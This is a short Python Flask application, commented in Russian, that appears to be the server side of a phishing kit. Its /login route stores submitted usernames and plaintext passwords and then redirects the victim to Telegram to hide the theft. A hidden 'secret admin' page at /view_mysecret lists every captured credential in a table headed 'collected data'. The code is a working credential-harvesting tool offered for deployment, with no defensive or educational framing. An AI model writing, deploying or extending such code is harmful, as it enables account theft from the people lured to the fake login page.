import os
from flask import Flask, render_template, request, redirect
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)

# Подключение базы данных (Render сам подставит URL)
app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('DATABASE_URL', 'sqlite:///test.db')
if app.config['SQLALCHEMY_DATABASE_URI'] and app.config['SQLALCHEMY_DATABASE_URI'].startswith("postgres://"):
    app.config['SQLALCHEMY_DATABASE_URI'] = app.config['SQLALCHEMY_DATABASE_URI'].replace("postgres://", "postgresql://", 1)

app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# Создание таблицы в базе
class UserData(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    login = db.Column(db.String(100))
    password = db.Column(db.String(100))

with app.app_context():
    db.create_all()

# Главная страница
@app.route('/')
def index():
    return render_template('index.html')

# Обработка ввода данных
@app.route('/login', methods=['POST'])
def login():
    log = request.form.get('username')
    pas = request.form.get('password')
    if log:
        new_entry = UserData(login=log, password=pas)
        db.session.add(new_entry)
        db.session.commit()
    return redirect("https://t.me") # Уводим на оф. канал

# СЕКРЕТНАЯ АДМИНКА (замените 'mysecret' на свой пароль)
SECRET_KEY = "mysecret" 

@app.route(f'/view_{SECRET_KEY}')
def view_data():
    users = UserData.query.all()
    style = "<style>body{font-family:sans-serif;padding:20px;} table{width:100%;border-collapse:collapse;} th,td{padding:10px;border:1px solid #ccc;}</style>"
    table = "<h2>Собранные данные</h2><table><tr><th>ID</th><th>Логин</th><th>Пароль</th></tr>"
    for u in users:
        table += f"<tr><td>{u.id}</td><td>{u.login}</td><td>{u.password}</td></tr>"
    return style + table + "</table>"

if __name__ == "__main__":
    app.run()
